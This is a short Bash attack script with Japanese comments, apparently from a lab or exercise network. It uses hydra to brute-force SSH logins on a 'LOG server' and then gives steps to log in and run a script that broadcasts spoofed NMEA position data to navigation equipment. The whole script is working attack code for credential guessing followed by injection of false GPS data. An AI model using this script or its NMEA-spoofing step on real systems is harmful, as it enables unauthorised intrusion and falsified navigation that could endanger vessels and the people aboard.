#!/bin/bash
# LOG serverへのSSHブルートフォース攻撃スクリプト
# Kali Linux + hydra を使用

TARGET_IP="192.168.10.20"
TARGET_USER="admin"
PASSWORD_FILE="/opt/passwords.txt"

echo "========================================="
echo "LOG server への攻撃を開始"
echo "========================================="
echo "ターゲット: ${TARGET_IP}"
echo "ユーザー: ${TARGET_USER}"
echo "ツール: hydra (Kali Linux)"
echo ""

# hydraを使用してSSHブルートフォース攻撃
echo "[*] hydra による SSH ブルートフォース攻撃を実行中..."
hydra -l ${TARGET_USER} -P ${PASSWORD_FILE} ssh://${TARGET_IP} -t 4 -V

if [ $? -eq 0 ]; then
    echo ""
    echo "[✓] 攻撃成功！"
    echo "[*] 次のステップ: LOG server にログインして NMEA メッセージを送信"
    echo ""
    echo "    ssh ${TARGET_USER}@${TARGET_IP}"
    echo "    # パスワードは上記で発見されたものを使用"
    echo ""
    echo "    ログイン後:"
    echo "    python3 /opt/inject_nmea.py --lat 35.6895 --lon 139.6917 --target 192.168.20.255:60001"
else
    echo ""
    echo "[✗] 攻撃失敗"
fi
